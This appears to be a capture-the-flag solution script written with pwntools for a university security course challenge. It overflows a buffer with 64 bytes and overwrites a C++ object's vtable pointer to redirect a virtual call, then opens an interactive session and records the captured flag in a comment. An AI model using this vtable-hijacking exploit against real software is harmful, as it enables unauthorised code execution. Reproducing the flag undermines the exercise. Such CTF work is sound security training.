#!/usr/bin/env python3

import pwn

exe = pwn.ELF("./vuln")
libc = pwn.ELF("./libc.so.6")
libc_plus_plus = pwn.ELF("./libstdc++.so.6.0.30")
#ld = pwn.ELF("./ld-linux-x86-64.so.2")

pwn.context.arch = 'amd64'

# 1) docker compose -f debug.yml up
# 2) docker exec -ti "$(docker ps -q -f 'ancestor=softsec/santas-cookie')" /bin/bash -c 'gdb -p "$(pgrep -n vuln)"'

conn = pwn.remote('tasks.ws24.softsec.rub.de', 32985)
#conn = pwn.remote('127.0.0.1', 1024)

# vuln has no pie so vtable is at well-known offset
# objdump -t ./vuln | c++filt | grep vtable
# currently there is this:
# 0000000000403db8  w    O .data.rel.ro	0000000000000018              vtable for Cookie
# we change to this:
# 0000000000403da0  w    O .data.rel.ro	0000000000000018              vtable for SantaSpecialCookie
vtable_SantaSpecialCookie = 0x0000000000403da0 + 16 # + 16 is the offset for decorate inside the vtable

payload = b'A'*64 + pwn.p64(vtable_SantaSpecialCookie)
conn.sendlineafter(b'Cookie decoration > ', payload)

# softsec{sdVc5FyNn_6giy5J49Gu4i7SdlnSxm8zAsUnPmJykxL0-jeg55m8tC1Qjm--VV45}
conn.interactive()